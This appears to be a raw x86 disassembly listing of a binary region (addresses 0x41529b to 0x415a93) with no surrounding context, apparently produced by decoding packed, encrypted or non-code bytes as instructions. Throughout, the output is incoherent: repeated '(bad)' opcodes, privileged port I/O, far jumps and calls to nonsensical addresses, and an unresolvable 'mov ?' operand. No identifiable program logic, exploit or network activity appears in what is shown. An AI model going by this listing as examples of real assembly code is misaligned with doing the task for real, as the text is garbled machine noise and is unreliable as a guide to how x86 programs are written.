  41529b:	or     BYTE PTR [edx-0x2],0x36
  41529f:	push   ebx
  4152a0:	sbb    al,0xb1
  4152a2:	mov    bh,0x81
  4152a4:	xchg   BYTE PTR [edi-0x22],bl
  4152a7:	aam    0x6b
  4152a9:	mov    esi,0xde36b88d
  4152ae:	pusha  
  4152af:	mov    bp,0x5e65
  4152b3:	cmp    ebp,eax
  4152b5:	inc    ecx
  4152b6:	std    
  4152b7:	fidivr WORD PTR [ebx-0x686235b6]
  4152bd:	(bad)  
  4152be:	jg     0x41530a
  4152c0:	into   
  4152c1:	shl    BYTE PTR [ecx-0x23],1
  4152c4:	xchg   ebp,eax
  4152c5:	in     al,dx
  4152c6:	pop    ecx
  4152c7:	or     edx,esp
  4152c9:	retf   
  4152ca:	cli    
  4152cb:	mov    edx,0x6ad4228c
  4152d0:	ret    
  4152d1:	and    DWORD PTR [edi+0x58],esp
  4152d4:	pop    ebx
  4152d5:	push   ds
  4152d6:	jo     0x415262
  4152d8:	les    ebx,FWORD PTR [esp+esi*1]
  4152db:	dec    esp
  4152dc:	or     ebp,DWORD PTR [esi+0x36]
  4152df:	mov    ch,0xab
  4152e1:	ret    
  4152e2:	pop    ecx
  4152e3:	rol    DWORD PTR fs:[ecx+0x3e66abe],1
  4152ea:	xchg   edx,eax
  4152eb:	pop    esi
  4152ec:	fs out 0xb9,al
  4152ef:	mov    esi,0x7d77b13c
  4152f4:	sub    dl,BYTE PTR [esi-0x59]
  4152f7:	stos   BYTE PTR es:[edi],al
  4152f8:	mov    ebx,0x5ff5c2d4
  4152fd:	lahf   
  4152fe:	inc    ebp
  4152ff:	jb     0x4152a7
  415301:	inc    ecx
  415302:	mov    edx,0x2a64b9bb
  415307:	and    dl,ah
  415309:	fwait
  41530a:	je     0x41533b
  41530c:	ss pusha 
  41530e:	packuswb mm7,QWORD PTR [esi+esi*1]
  415312:	aaa    
  415313:	(bad)  
  415314:	sbb    BYTE PTR [ebx],al
  415316:	inc    esi
  415317:	adc    ebp,DWORD PTR [ebp+esi*1+0x7e732516]
  41531e:	push   ebp
  41531f:	push   es
  415320:	ins    BYTE PTR es:[edi],dx
  415321:	in     al,dx
  415322:	mov    cl,0xb0
  415324:	addr16 push ebp
  415326:	sbb    BYTE PTR [ecx],al
  415328:	es leave 
  41532a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41532b:	mov    ds:0xe01ba91a,al
  415330:	cmp    ebx,DWORD PTR [eax+esi*8+0x3be66505]
  415337:	mov    ds:0x348c77c5,al
  41533c:	xor    bh,BYTE PTR [eax]
  41533e:	and    bh,dh
  415340:	or     eax,esi
  415342:	mov    ?,WORD PTR [ebp+0x26]
  415345:	fcos   
  415347:	xor    eax,0x4198f0ff
  41534c:	xor    eax,0x6bdd35f1
  415351:	(bad)  
  415352:	js     0x41535f
  415354:	test   eax,0x628ca52d
  415359:	pushf  
  41535a:	into   
  41535b:	lea    ebp,[edi+0x40]
  41535e:	dec    ebp
  41535f:	mov    al,0xb
  415361:	aam    0xf3
  415363:	fdivr  st(7),st
  415365:	(bad)  
  415366:	int3   
  415367:	inc    edx
  415368:	mov    al,0x4d
  41536a:	cmp    DWORD PTR [ecx+0x6ebbd247],edi
  415370:	jb     0x4153aa
  415372:	mov    bh,BYTE PTR [esi]
  415374:	cli    
  415375:	sbb    eax,0x4e2d854d
  41537a:	loop   0x41538d
  41537c:	aad    0xa7
  41537e:	rcl    DWORD PTR [edx-0x7d6e46a7],0x51
  415385:	xchg   ebp,eax
  415386:	xchg   esi,eax
  415387:	or     ch,BYTE PTR [ecx+eax*4+0x50]
  41538b:	pop    ds
  41538c:	les    edx,FWORD PTR [ebx-0x6d]
  41538f:	loope  0x4153f8
  415391:	lea    edi,[edx+0x75]
  415394:	add    BYTE PTR [edx+0x42172dff],cl
  41539a:	scas   al,BYTE PTR es:[edi]
  41539b:	xor    DWORD PTR [esi],ebx
  41539d:	and    BYTE PTR [edx-0x71b45dcd],dh
  4153a3:	jae    0x41533d
  4153a5:	push   ebx
  4153a6:	nop
  4153a7:	push   ds
  4153a8:	out    dx,eax
  4153a9:	sbb    eax,esi
  4153ab:	(bad)  
  4153ac:	pop    ebx
  4153ad:	out    0xa0,eax
  4153af:	rcl    ecx,cl
  4153b1:	(bad)  
  4153b2:	ds pop esi
  4153b4:	cli    
  4153b5:	sti    
  4153b6:	inc    eax
  4153b7:	mov    edi,ds
  4153b9:	mov    DWORD PTR [edx-0x7a],eax
  4153bc:	gs je  0x41540e
  4153bf:	jne    0x4153bd
  4153c1:	mov    DWORD PTR [ebp+0x57c7b1a],edi
  4153c7:	div    BYTE PTR [ebx+0x5b]
  4153ca:	inc    ecx
  4153cb:	aas    
  4153cc:	leave  
  4153cd:	retf   
  4153ce:	fcmovbe st,st(4)
  4153d0:	push   edx
  4153d1:	xchg   DWORD PTR [ecx+0xd25125b],ebx
  4153d7:	jl     0x415385
  4153d9:	int    0xf7
  4153db:	jns    0xd3bed1bf
  4153e1:	outs   dx,DWORD PTR ds:[esi]
  4153e2:	leave  
  4153e3:	jne    0x4153ef
  4153e5:	daa    
  4153e6:	inc    esi
  4153e7:	je     0x415424
  4153e9:	mov    dl,BYTE PTR [esi]
  4153eb:	cli    
  4153ec:	adc    ebp,DWORD PTR [ebx-0x1c9ce481]
  4153f2:	clc    
  4153f3:	adc    DWORD PTR [ebx+0x1b417e6a],0x252b2cc6
  4153fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153fe:	adc    BYTE PTR [ebx],ch
  415400:	outs   dx,DWORD PTR ds:[esi]
  415401:	test   BYTE PTR [ebx],0x83
  415404:	mov    edi,es
  415406:	lods   eax,DWORD PTR ds:[esi]
  415407:	jl     0x41540d
  415409:	xor    bl,0x5f
  41540c:	mov    esp,0xd66784fa
  415411:	dec    edx
  415412:	mov    ah,BYTE PTR [edx-0x75cde18e]
  415418:	cmp    BYTE PTR [ecx+edi*1-0x68],al
  41541c:	dec    ebx
  41541d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41541e:	cmp    al,0x9
  415420:	inc    edx
  415421:	xor    dh,bh
  415423:	mov    eax,ds:0x46f81f49
  415428:	pop    ds
  415429:	adc    al,0x4c
  41542b:	std    
  41542c:	mov    al,0xb7
  41542e:	add    al,BYTE PTR [esi+ebp*1+0xb]
  415432:	jecxz  0x4153b4
  415434:	ds into 
  415436:	inc    edx
  415437:	xchg   esi,eax
  415438:	mov    ebp,0xf427f986
  41543d:	inc    edi
  41543e:	push   0x2b
  415440:	jne    0x4153e9
  415442:	add    DWORD PTR [edi],ebx
  415444:	pop    edx
  415445:	pushf  
  415446:	mov    esp,0x1cb6fa3
  41544b:	pop    ebp
  41544c:	jne    0x415420
  41544e:	push   ecx
  41544f:	jnp    0x415419
  415451:	push   0xffffffbd
  415453:	dec    ecx
  415454:	nop
  415455:	imul   edi,DWORD PTR [ebx+esi*2],0x92127187
  41545c:	jb     0x415418
  41545e:	imul   edx,edx,0xe
  415461:	sub    al,0x63
  415463:	imul   ebp,DWORD PTR [edi+0x6510ef1a],0xdb0816a3
  41546d:	lea    esp,[eax+0x6fe63a0b]
  415473:	adc    BYTE PTR [esi-0x46201ee1],cl
  415479:	cmp    ecx,ebp
  41547b:	ja     0x4154fb
  41547d:	dec    esp
  41547e:	out    0x21,al
  415480:	mov    ebx,0xaf9754f7
  415485:	inc    eax
  415486:	jo     0x4154b7
  415488:	jp     0x415488
  41548a:	mov    bl,0xf9
  41548c:	inc    esp
  41548d:	mov    ch,0x58
  41548f:	fist   DWORD PTR [eax+0x3e]
  415492:	aam    0x6b
  415494:	ins    BYTE PTR es:[edi],dx
  415495:	in     al,0xe6
  415497:	scas   al,BYTE PTR es:[edi]
  415498:	xchg   edi,eax
  415499:	stos   BYTE PTR es:[edi],al
  41549a:	dec    esi
  41549b:	mov    al,0x12
  41549d:	dec    eax
  41549e:	fs or  edx,eax
  4154a1:	push   ecx
  4154a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154a3:	js     0x4154a0
  4154a5:	scas   eax,DWORD PTR es:[edi]
  4154a6:	das    
  4154a7:	cmc    
  4154a8:	test   al,0x98
  4154aa:	sbb    eax,0x5d86dd1c
  4154af:	sub    DWORD PTR [edi],edi
  4154b1:	pop    edi
  4154b2:	test   ebx,esi
  4154b4:	inc    ebx
  4154b5:	jmp    0x41548c
  4154b7:	jmp    0x9e89:0x2c8e3502
  4154be:	sub    bl,BYTE PTR [eiz*4+0x65e0bd95]
  4154c5:	fwait
  4154c6:	cmp    ebp,DWORD PTR [ebp-0x74]
  4154c9:	rcl    BYTE PTR [edx],1
  4154cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154cc:	jnp    0x41551d
  4154ce:	jle    0x415485
  4154d0:	jmp    0xff5f5ccb
  4154d5:	adc    BYTE PTR [edx+0x20e08c12],ah
  4154db:	inc    ecx
  4154dc:	je     0x415474
  4154de:	pusha  
  4154df:	jbe    0x4154a8
  4154e1:	inc    esp
  4154e2:	daa    
  4154e3:	cmp    ebp,DWORD PTR [ecx+0x5b]
  4154e6:	cmp    esi,DWORD PTR [eax+0x2a]
  4154e9:	mov    bl,0x9e
  4154eb:	and    ebx,DWORD PTR [ebx+0x33]
  4154ee:	inc    ebp
  4154ef:	cld    
  4154f0:	hlt    
  4154f1:	rol    DWORD PTR [eax],cl
  4154f3:	jl     0x4154e0
  4154f5:	adc    bh,al
  4154f7:	xchg   ebp,eax
  4154f8:	add    ebp,DWORD PTR [edi+ecx*4-0x2a]
  4154fc:	pop    es
  4154fd:	mov    bl,0xff
  4154ff:	clc    
  415500:	(bad)  
  415501:	leave  
  415502:	and    esi,DWORD PTR gs:[ecx]
  415505:	jnp    0x415532
  415507:	fmul   QWORD PTR [edi]
  415509:	leave  
  41550a:	je     0x4154c7
  41550c:	ins    BYTE PTR es:[edi],dx
  41550d:	cmp    BYTE PTR [ecx],bh
  41550f:	mov    ah,0x72
  415511:	push   es
  415512:	jo     0x4154e0
  415514:	mov    bh,0xf1
  415516:	jmp    0x4154f0
  415518:	sub    BYTE PTR [ecx-0x1911122],dl
  41551e:	out    dx,al
  41551f:	cmp    eax,0xccaeab8c
  415524:	sbb    eax,0x45faf10c
  415529:	sti    
  41552a:	out    dx,eax
  41552b:	jecxz  0x415554
  41552d:	aaa    
  41552e:	ins    BYTE PTR es:[edi],dx
  41552f:	mov    WORD PTR ds:0xaecbc013,fs
  415535:	int    0x92
  415537:	sbb    cl,BYTE PTR [ecx-0xcbad2d4]
  41553d:	inc    esp
  41553e:	ins    BYTE PTR es:[edi],dx
  41553f:	outs   dx,DWORD PTR ds:[esi]
  415540:	mov    esp,0x962e24b3
  415545:	push   ds
  415546:	enter  0x7864,0x8c
  41554a:	sub    dl,0xf2
  41554d:	or     eax,0xfc515c33
  415552:	lock (bad) [ebx-0x2b6ddece]
  415559:	ficom  WORD PTR [eax-0x26]
  41555c:	aad    0x9a
  41555e:	xchg   DWORD PTR [esi],eax
  415560:	push   edi
  415561:	fcmovnbe st,st(7)
  415563:	sbb    al,0x1c
  415565:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415566:	je     0x4155de
  415568:	push   0xf524f227
  41556d:	mov    ch,0xc3
  41556f:	arpl   WORD PTR [esi],bx
  415571:	adc    ah,BYTE PTR [ebx+0x4bc3648c]
  415577:	mov    ah,0xdf
  415579:	cs repz retf 
  41557c:	adc    bh,BYTE PTR [esi-0x5657b3b4]
  415582:	pop    ds
  415583:	xchg   ecx,eax
  415584:	adc    DWORD PTR [ebp-0x66],ecx
  415587:	xor    BYTE PTR [ebx-0x3f],dh
  41558a:	push   eax
  41558b:	in     eax,dx
  41558c:	cmp    eax,0xae71511c
  415591:	mov    DWORD PTR [ecx],esp
  415593:	aad    0x75
  415595:	adc    BYTE PTR [esi*2-0x58365d0f],0x9f
  41559d:	adc    ebx,DWORD PTR [edx]
  41559f:	mov    ebx,0xdf5ad153
  4155a4:	xchg   ecx,eax
  4155a5:	mov    edi,0xfffe5c65
  4155aa:	pop    ebx
  4155ab:	add    DWORD PTR [edi+eax*2],ebx
  4155ae:	ret    0xd0b9
  4155b1:	push   DWORD PTR [ebp+0x14f23df2]
  4155b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155b8:	sbb    dh,dl
  4155ba:	pop    esi
  4155bb:	and    eax,0x2004cbfc
  4155c0:	pusha  
  4155c1:	jnp    0x4155d3
  4155c3:	jne    0x415564
  4155c5:	idiv   ebp
  4155c7:	scas   eax,DWORD PTR es:[edi]
  4155c8:	imul   ebp,DWORD PTR [ebp-0x5c79800f],0x29
  4155cf:	pop    eax
  4155d0:	mov    al,ds:0x26780d17
  4155d5:	mov    esi,0x395d755b
  4155da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155db:	mov    esp,0xa7b5f898
  4155e0:	fidiv  DWORD PTR [eax-0x18a67c16]
  4155e6:	mov    dl,0xf6
  4155e8:	dec    esp
  4155e9:	(bad)  
  4155ea:	popa   
  4155eb:	dec    ebp
  4155ec:	popf   
  4155ed:	and    al,0xae
  4155ef:	rol    BYTE PTR [edi+eiz*2+0x6514a397],0xc7
  4155f7:	call   0x72b4c947
  4155fc:	ins    BYTE PTR es:[edi],dx
  4155fd:	enter  0x44db,0xf2
  415601:	in     eax,0x39
  415603:	xchg   esi,eax
  415604:	js     0x4155c7
  415606:	rcl    BYTE PTR [ebx+ebp*2+0x5feb41ba],cl
  41560d:	or     ch,BYTE PTR [ecx-0x48003ce7]
  415613:	dec    eax
  415614:	pop    ecx
  415615:	or     ecx,ebx
  415617:	test   BYTE PTR [esp+ebp*1+0x2242e110],dl
  41561e:	jae    0x4155e0
  415620:	into   
  415621:	cmp    ch,BYTE PTR [esi+eax*4-0x23654be6]
  415628:	hlt    
  415629:	push   ds
  41562a:	inc    esp
  41562b:	jg     0x4155d9
  41562d:	(bad)  
  41562e:	mov    edi,0x927e0079
  415633:	pop    ecx
  415634:	and    ah,BYTE PTR [edi]
  415636:	neg    DWORD PTR [edx]
  415638:	mov    ds:0x837e8ca,eax
  41563d:	push   0xffffffc3
  41563f:	or     eax,DWORD PTR [edi-0x41]
  415642:	add    bh,ah
  415644:	dec    edi
  415645:	pop    ds
  415646:	cs pop esi
  415648:	icebp  
  415649:	dec    ebx
  41564a:	or     BYTE PTR [edx+esi*2-0x15b4a061],0xf7
  415652:	jmp    DWORD PTR [ebx]
  415654:	stc    
  415655:	sub    al,0x70
  415657:	sti    
  415658:	jno    0x4156c0
  41565a:	sar    DWORD PTR [bx+di+0x3a21],0xd0
  415660:	in     al,dx
  415661:	retf   0xd515
  415664:	rsqrtps xmm4,XMMWORD PTR [eax+0x66afd381]
  41566b:	fst    QWORD PTR gs:[edi-0x2e]
  41566f:	add    BYTE PTR [esp+eax*1],ah
  415672:	pop    ds
  415673:	mov    BYTE PTR [edi+0x1fa6aed8],bh
  415679:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41567a:	addr16 ss inc ebx
  41567d:	mov    WORD PTR [esi],fs
  41567f:	jp     0x415666
  415681:	adc    BYTE PTR [edx-0xb],dh
  415684:	and    eax,0x666c4449
  415689:	inc    esi
  41568a:	mov    eax,0xad34142
  41568f:	jns    0x4156a6
  415691:	js     0x4156a6
  415693:	mov    ds:0x3cabb7cb,eax
  415698:	aaa    
  415699:	ficomp WORD PTR [eax+0x795f6db9]
  4156a0:	ins    DWORD PTR es:[edi],dx
  4156a1:	push   esp
  4156a2:	jb     0x415679
  4156a4:	jg     0x415654
  4156a6:	sbb    BYTE PTR [eax-0x1a],cl
  4156a9:	xchg   ebx,eax
  4156aa:	repz in eax,dx
  4156ac:	call   0xc17dca3e
  4156b1:	mov    eax,0xfb85aa31
  4156b6:	mov    esi,0x16861b2b
  4156bb:	xchg   ecx,eax
  4156bc:	or     dh,dh
  4156be:	jmp    0xd7d63c6e
  4156c3:	sub    al,0x64
  4156c5:	cvttps2pi mm1,xmm0
  4156c8:	sbb    al,0xe3
  4156ca:	adc    DWORD PTR [ebx],0xfa637eb0
  4156d0:	fwait
  4156d1:	push   ds
  4156d2:	int3   
  4156d3:	fucom  st(2)
  4156d5:	ret    0x5942
  4156d8:	add    DWORD PTR ds:0x11d49d74,eax
  4156de:	dec    esp
  4156df:	ins    DWORD PTR es:[edi],dx
  4156e0:	pop    esi
  4156e1:	lock inc esp
  4156e3:	adc    DWORD PTR [edi],esi
  4156e5:	aam    0x65
  4156e7:	mov    DWORD PTR [edx+0x9efa7bc],0x4f5a7e28
  4156f1:	imul   DWORD PTR [ebp+0x6f3e136e]
  4156f7:	xchg   ebx,eax
  4156f8:	iret   
  4156f9:	jg     0x4156fd
  4156fb:	out    0x1e,eax
  4156fd:	repnz push ss
  4156ff:	retf   0x2c2c
  415702:	mov    al,0x26
  415704:	pop    eax
  415705:	xor    dh,bh
  415707:	and    eax,0xf481e17e
  41570c:	xchg   edx,eax
  41570d:	cwde   
  41570e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41570f:	push   edi
  415710:	call   0xe200:0xcc3f9ba7
  415717:	sub    BYTE PTR ds:0x406879e1,0x4
  41571e:	pop    ebx
  41571f:	mov    esi,0xb1b01089
  415724:	scas   eax,DWORD PTR es:[edi]
  415725:	jne    0x415703
  415727:	mov    al,0x7f
  415729:	enter  0xee2,0x18
  41572d:	xchg   BYTE PTR [eax+0x66],dh
  415730:	mov    ebp,0x4fd0c79c
  415735:	jp     0x4156ee
  415737:	xchg   esi,eax
  415738:	and    BYTE PTR [edi],dl
  41573a:	int    0x54
  41573c:	dec    esi
  41573d:	pop    es
  41573e:	jmp    0xb32c9b50
  415743:	verr   sp
  415746:	dec    esi
  415747:	data16 jg 0x415788
  41574a:	and    ebp,ebp
  41574c:	jmp    0x431a6919
  415751:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415752:	stos   DWORD PTR es:[edi],eax
  415753:	in     al,0x37
  415755:	out    0xc0,al
  415757:	add    ebp,eax
  415759:	rol    DWORD PTR [edx-0x15],1
  41575c:	and    DWORD PTR [edx-0x312fce96],0xfeefa5c
  415766:	and    DWORD PTR [ecx-0x40],0xdcb6ec91
  41576d:	out    dx,eax
  41576e:	(bad)  [ecx+0x7a]
  415771:	adc    esi,ebp
  415773:	inc    eax
  415774:	daa    
  415775:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415776:	xchg   edx,eax
  415777:	je     0x41575d
  415779:	inc    edx
  41577a:	(bad)  
  41577b:	ss aad 0x72
  41577e:	pop    ss
  41577f:	pusha  
  415780:	jns    0x415797
  415782:	push   ecx
  415783:	(bad)  
  415784:	out    dx,al
  415785:	mov    ah,0xcd
  415787:	inc    ecx
  415788:	mov    fs,WORD PTR [esi-0x7c9f2649]
  41578e:	pop    ebp
  41578f:	imul   esp,esp,0x2c
  415792:	stos   BYTE PTR es:[edi],al
  415793:	and    edi,esp
  415795:	push   edx
  415796:	xsavec [ecx+0x3ed57d64]
  41579d:	retf   
  41579e:	or     eax,0xdd96231d
  4157a3:	call   0x30398b72
  4157a8:	jecxz  0x415753
  4157aa:	xor    edi,DWORD PTR [ecx+edi*4]
  4157ad:	add    eax,0x4c0158e9
  4157b2:	inc    eax
  4157b3:	jl     0x415777
  4157b5:	addr16 jns 0x415824
  4157b8:	bts    DWORD PTR [esi+0x1c72183c],ecx
  4157bf:	cmp    BYTE PTR [ecx+0x1b],ch
  4157c2:	sub    dh,BYTE PTR [eax-0x6e0c5300]
  4157c8:	icebp  
  4157c9:	cld    
  4157ca:	adc    al,cl
  4157cc:	test   al,0xfd
  4157ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157d0:	neg    DWORD PTR [edx]
  4157d2:	fld    DWORD PTR [ebx]
  4157d4:	enter  0xe240,0xda
  4157d8:	mov    ds:0x31f4a9f5,al
  4157dd:	inc    ebp
  4157de:	push   esi
  4157df:	and    ebx,DWORD PTR [ebx]
  4157e1:	jbe    0x41581d
  4157e3:	(bad)  
  4157e4:	loopne 0x4157b2
  4157e6:	cdq    
  4157e7:	xor    eax,0xb07a1830
  4157ec:	aam    0x1f
  4157ee:	call   0x7bc71cd0
  4157f3:	test   al,0xc0
  4157f5:	call   0xf0b3:0x30cc3e86
  4157fc:	jo     0x415849
  4157fe:	mov    edx,0x2f85848a
  415803:	mov    eax,0x5f16f9c3
  415808:	xchg   ecx,eax
  415809:	and    BYTE PTR [eax+0x70],0x2e
  41580d:	jns    0x4157ac
  41580f:	jmp    0xdb6d:0xe3f26d76
  415816:	xchg   esi,eax
  415817:	sbb    ebp,DWORD PTR [eax-0x54756015]
  41581d:	mov    DWORD PTR [eax],0x6ff4ccee
  415823:	mov    bl,0x3b
  415825:	or     al,0x17
  415827:	popf   
  415828:	xchg   edi,eax
  415829:	out    dx,eax
  41582a:	add    BYTE PTR [esp+eax*8],ch
  41582d:	ds pushf 
  41582f:	fsubr  QWORD PTR [edi+0x59]
  415832:	shr    DWORD PTR [ecx-0x56],1
  415835:	int    0x53
  415837:	push   edi
  415838:	in     al,dx
  415839:	data16 int3 
  41583b:	lods   eax,DWORD PTR ds:[esi]
  41583c:	pop    ecx
  41583d:	call   0x2c05:0xf67a30ed
  415844:	inc    edx
  415845:	jmp    0x415d16c4
  41584a:	sub    eax,0x28fb4b69
  41584f:	lea    ebp,[eax+ebp*4]
  415852:	es fs push 0xa8a46c75
  415859:	arpl   WORD PTR [ebx+edi*4],cx
  41585c:	jmp    0x415883
  41585e:	jge    0x415884
  415860:	and    BYTE PTR [ecx],ch
  415862:	adc    al,0xfc
  415864:	xor    eax,0xa16bd708
  415869:	cli    
  41586a:	mov    ch,0xfd
  41586c:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41586e:	adc    ah,BYTE PTR [ecx+esi*1]
  415871:	xchg   esp,eax
  415872:	xchg   ecx,eax
  415873:	cmp    al,0x6d
  415875:	inc    ebx
  415876:	fwait
  415877:	cdq    
  415878:	lods   eax,DWORD PTR ds:[esi]
  415879:	das    
  41587a:	call   0x6619:0xf6a282b
  415881:	sbb    ebp,esi
  415883:	out    dx,eax
  415884:	sbb    BYTE PTR [ebp-0x17944167],dl
  41588a:	and    esi,DWORD PTR [ebx+0x76]
  41588d:	aas    
  41588e:	xchg   cl,cl
  415890:	je     0x415879
  415892:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415893:	dec    edx
  415894:	jl     0x415867
  415896:	mov    cl,0x64
  415898:	lds    esp,FWORD PTR [edi+eax*2]
  41589b:	lds    ebp,FWORD PTR ds:0x1054af4b
  4158a1:	sbb    ebp,esp
  4158a3:	mov    esp,0xb3519751
  4158a8:	pushf  
  4158a9:	dec    DWORD PTR [ebp-0x49]
  4158ac:	int    0xef
  4158ae:	arpl   WORD PTR ds:0x5c644f53,dx
  4158b4:	inc    esp
  4158b5:	inc    eax
  4158b6:	test   al,0xd9
  4158b8:	jmp    0x1cc8860c
  4158bd:	push   eax
  4158be:	inc    edx
  4158bf:	mov    ecx,0x1e3c6b71
  4158c4:	pop    esp
  4158c5:	daa    
  4158c6:	and    bh,BYTE PTR [edi-0xa76f7d3]
  4158cc:	add    BYTE PTR [esi-0x324b4bcc],dl
  4158d2:	cmp    ecx,DWORD PTR [esi-0x58]
  4158d5:	and    ebp,eax
  4158d7:	jo     0x4158fd
  4158d9:	jle    0x4158ae
  4158db:	inc    edi
  4158dc:	(bad)  
  4158dd:	xor    DWORD PTR [eax-0x6a],ebp
  4158e0:	lods   eax,DWORD PTR ds:[esi]
  4158e1:	int    0x13
  4158e3:	dec    esi
  4158e4:	push   esi
  4158e5:	push   edi
  4158e6:	push   ebp
  4158e7:	sbb    eax,0x4d8372ea
  4158ec:	test   al,0xc9
  4158ee:	ret    0x9ad0
  4158f1:	sti    
  4158f2:	(bad)  
  4158f3:	adc    eax,0x36bb254b
  4158f8:	ins    DWORD PTR es:[edi],dx
  4158f9:	or     BYTE PTR [ecx+0x11],al
  4158fc:	les    ecx,FWORD PTR [edx+0x77]
  4158ff:	and    eax,0xcefd9c08
  415904:	(bad)  
  415906:	mov    eax,DWORD PTR [ebx]
  415908:	sub    BYTE PTR [esi-0x1366cd43],al
  41590e:	bound  ebp,QWORD PTR [edi+0x55]
  415911:	and    al,0x21
  415913:	inc    ecx
  415914:	sbb    al,0xed
  415916:	mov    ds:0xd7be9d87,al
  41591b:	cwde   
  41591c:	loop   0x41590f
  41591e:	adc    esi,ebx
  415920:	xor    BYTE PTR [esi-0x72ad3041],ah
  415926:	inc    ebx
  415927:	mov    ah,0xbf
  415929:	cmc    
  41592a:	add    DWORD PTR [esi],edx
  41592c:	add    bl,BYTE PTR [esi]
  41592e:	lock ss sub eax,0x4a282b8f
  415935:	dec    edi
  415936:	cs mov cl,0x29
  415939:	inc    esp
  41593a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41593b:	and    edi,edx
  41593d:	add    edx,ebx
  41593f:	jo     0x41594f
  415941:	rcr    bh,cl
  415943:	cs push ebx
  415945:	test   eax,0xfa6a8145
  41594a:	mov    ch,0x11
  41594c:	bound  edi,QWORD PTR [ecx+0xa]
  41594f:	push   es
  415950:	jge    0x41598e
  415952:	or     al,0x4c
  415954:	add    DWORD PTR [ebx-0x78],edx
  415957:	int3   
  415958:	push   esp
  415959:	or     eax,0xdbcb30f1
  41595e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41595f:	pop    edx
  415960:	xor    al,0x58
  415962:	inc    edx
  415963:	xor    BYTE PTR [edi+0x77],bl
  415966:	or     DWORD PTR [eax-0x672c01b0],0xffffffbc
  41596d:	xor    eax,DWORD PTR [ebx+0x33e49a29]
  415973:	adc    DWORD PTR [ebx-0x1b],esp
  415976:	ja     0x415914
  415978:	mov    ebp,DWORD PTR [edi]
  41597a:	stc    
  41597b:	ret    0x1af1
  41597e:	int    0xce
  415980:	inc    ebx
  415981:	and    al,0x19
  415983:	fwait
  415984:	xor    eax,0xf91cd57f
  415989:	mov    eax,0x954137fd
  41598e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41598f:	pushf  
  415990:	jmp    0x2c32d1c4
  415995:	mov    esp,0x991345ba
  41599a:	jle    0x4159a1
  41599c:	add    eax,0x60a79192
  4159a1:	sub    ebp,edi
  4159a3:	addr16 mov ebx,0x50762516
  4159a9:	stos   BYTE PTR es:[edi],al
  4159aa:	dec    ebp
  4159ab:	adc    al,0x19
  4159ad:	pop    eax
  4159ae:	sbb    esp,DWORD PTR [ecx+eax*1+0x36161384]
  4159b5:	(bad)  
  4159b6:	fdivr  QWORD PTR [edx-0x15]
  4159b9:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4159bb:	add    eax,0xd5314d4f
  4159c0:	retf   0x9383
  4159c3:	jb     0x4159da
  4159c5:	mov    ds:0x9902c0e9,eax
  4159ca:	jo     0x415971
  4159cc:	mov    ah,0x78
  4159ce:	ret    0x90d6
  4159d1:	adc    bl,BYTE PTR [edi+0x49d752ce]
  4159d7:	arpl   WORD PTR [ecx+0x44],ax
  4159da:	imul   ebx,ebp,0x5606fc6e
  4159e0:	sbb    al,0x21
  4159e2:	fst    st(0)
  4159e4:	pushf  
  4159e5:	adc    DWORD PTR [eax+0x23cc256],0x454b6248
  4159ef:	in     eax,0x68
  4159f1:	popa   
  4159f2:	mov    ch,BYTE PTR [ebp+0x50]
  4159f5:	(bad)  
  4159f6:	pop    edx
  4159f7:	retf   
  4159f8:	push   esp
  4159f9:	pop    ds
  4159fa:	or     BYTE PTR ds:0x519fe2b,al
  415a00:	cli    
  415a01:	out    dx,eax
  415a02:	xchg   ebx,eax
  415a03:	cmp    al,0xb5
  415a05:	cld    
  415a06:	cmp    al,0x99
  415a08:	ret    0xccde
  415a0b:	cmp    eax,0x6c006b82
  415a10:	or     eax,0x7fb322ff
  415a15:	dec    ebx
  415a16:	or     DWORD PTR [ebx+eiz*1],0x5f
  415a1a:	pushw  es
  415a1c:	sbb    BYTE PTR [edx+0xf06b825],bh
  415a22:	push   0x6a9ae22a
  415a27:	adc    esp,DWORD PTR [esi-0x35]
  415a2a:	pop    esi
  415a2b:	mov    bh,0xea
  415a2d:	mov    al,ds:0x23943503
  415a32:	pop    eax
  415a33:	sub    dl,ch
  415a35:	test   al,0x6b
  415a37:	pop    ss
  415a38:	dec    DWORD PTR [edi-0x655d1a05]
  415a3e:	mov    DWORD PTR [ebp+edi*4-0xee9d027],edx
  415a45:	and    bh,al
  415a47:	cmp    bl,bl
  415a49:	sbb    DWORD PTR [esi-0x43f56528],ecx
  415a4f:	add    eax,0x3d3ef95
  415a54:	inc    edi
  415a55:	push   esi
  415a56:	mov    ch,0x1f
  415a58:	test   al,0x5b
  415a5a:	repnz fnstenv [edi+0x3ae50241]
  415a61:	sbb    esp,edi
  415a63:	inc    ecx
  415a64:	popf   
  415a65:	jmp    DWORD PTR [ecx]
  415a67:	xchg   esp,eax
  415a68:	pusha  
  415a69:	or     eax,0xa812e18
  415a6e:	sub    al,0x62
  415a70:	sbb    BYTE PTR [ecx],al
  415a72:	adc    eax,0xc3eef50f
  415a77:	xchg   esp,eax
  415a78:	sahf   
  415a79:	data16 lods al,BYTE PTR ds:[esi]
  415a7b:	in     al,dx
  415a7c:	pop    esi
  415a7d:	mov    al,ds:0x98d84b21
  415a82:	aaa    
  415a83:	jo     0x415a50
  415a85:	cmp    ebp,DWORD PTR [edi+0x2a8034af]
  415a8b:	jmp    0x4369538b
  415a90:	push   es
  415a91:	clc    
  415a92:	lods   al,BYTE PTR ds:[esi]
  415a93:	push   ss
